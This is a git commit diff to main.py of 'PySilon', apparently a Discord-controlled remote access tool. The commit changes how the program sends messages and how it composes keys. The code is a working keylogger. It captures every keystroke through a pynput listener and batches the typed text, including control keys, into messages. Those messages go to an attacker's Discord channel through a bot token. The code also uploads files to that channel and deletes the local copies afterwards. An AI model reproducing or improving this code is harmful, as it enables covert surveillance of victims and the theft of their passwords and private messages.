fcfbff6964476e204aec67fccd4c2d17455ff622
Mateusz Gołembowski <44233157+mategol@users.noreply.github.com>
2022-11-21 11:33:56 +0100

    Changed message sending method and improved key composition

--- main.py
+++ main.py
@@ -14,6 +14,7 @@ from resources.misc import *
 client = discord.Client(intents=discord.Intents.all())
 ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\t': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}
 text_buffor, force_to_send = '', False
+messages_to_send, files_to_send = [], []
 
 bot_token = ''   # Paste here BOT-token
 software_registry_name = 'PySilon'   # -------------------------------------------- Software name shown in registry
@@ -38,13 +39,22 @@ if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_
 
 @client.event
 async def on_ready():
-    global text_buffor, force_to_send
+    global text_buffor, force_to_send, messages_to_send
     await client.get_channel(channel_ids['main']).send('```[' + current_time() + '] New PC session```')
     while True:
-        await asyncio.sleep(0.1)
-        if len(text_buffor) > 1500 or force_to_send:
-            await client.get_channel(channel_ids['main']).send(text_buffor.strip())
-            text_buffor, force_to_send = '', False
+        if len(messages_to_send) > 0:
+            for message in messages_to_send:
+                await client.get_channel(message[0]).send(message[1])
+                await asyncio.sleep(0.1)
+            messages_to_send = []
+        if len(files_to_send) > 0:
+            for file in files_to_send:
+                await client.get_channel(file[0]).send(file[1], file=discord.File(file[2], filename=file[2]))
+                await asyncio.sleep(0.1)
+                if file[3]:
+                    os.system('del ' + file[2])
+            messages_to_send = []
+        await asyncio.sleep(1)
 
 @client.event
 async def on_message(message):
@@ -66,21 +76,19 @@ async def on_message(message):
     '''
 
 def on_press(key):
-    global text_buffor, force_to_send
+    global text_buffor, force_to_send, messages_to_send
     processed_key = str(key)[1:-1] if (str(key)[0]=='\'' and str(key)[-1]=='\'') else key
     if processed_key in ctrl_codes.keys():
-        processed_key = ctrl_codes[processed_key]
+        processed_key = ' `' + ctrl_codes[processed_key] + '`'
     if processed_key not in [Key.ctrl_l, Key.alt_gr, Key.left, Key.right, Key.up, Key.down, Key.delete, Key.alt_l, Key.shift_r]:
         match processed_key:
-            case Key.space:
-                processed_key = ' '
-            case Key.shift:
-                processed_key = ' *`SHIFT`*'
-            case Key.enter:
-                processed_key = ' *`ENTER`*'
-                force_to_send = True
-
+            case Key.space: processed_key = ' '
+            case Key.shift: processed_key = ' *`SHIFT`*'
+            case Key.enter: processed_key = ''; messages_to_send.append([channel_ids['main'], text_buffor + ' *`ENTER`*']); text_buffor = ''
         text_buffor += str(processed_key)
+        if len(text_buffor) > 1975:
+            messages_to_send.append([channel_ids['main'], text_buffor])
+            text_buffor = ''
 
 with Listener(on_press=on_press) as listener:
     client.run(bot_token)
